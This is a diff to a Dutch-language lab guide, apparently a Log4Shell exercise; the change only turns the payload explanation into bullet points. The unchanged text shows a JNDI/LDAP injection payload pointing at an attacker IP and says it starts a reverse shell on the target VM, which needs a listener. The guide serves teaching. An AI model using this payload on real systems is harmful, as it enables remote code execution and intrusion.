@@ -41,11 +41,11 @@ Gebruik de volgende payload in het formulier op de target:
 ```text
 ${jndi:ldap://<attacker-ip>:1389/a}
 ```
-jndi = een Java API waarmee je objecten kunt opzoeken
-ldap:// = het protocol
-10.0.2.5 = IP van de aanvaller / LDAP-server
-:1389 = standaard poort voor LDAP
-/a = zoekpad of zoek-id in de LDAP-directory
+- jndi = een Java API waarmee je objecten kunt opzoeken
+- ldap:// = het protocol
+- 10.0.2.5 = IP van de aanvaller / LDAP-server
+- :1389 = standaard poort voor LDAP
+- /a = zoekpad of zoek-id in de LDAP-directory
 
 De exploit zal een reverse-shell starten vanop de target VM.
 Hiervoor moeten we een listener opzetten:
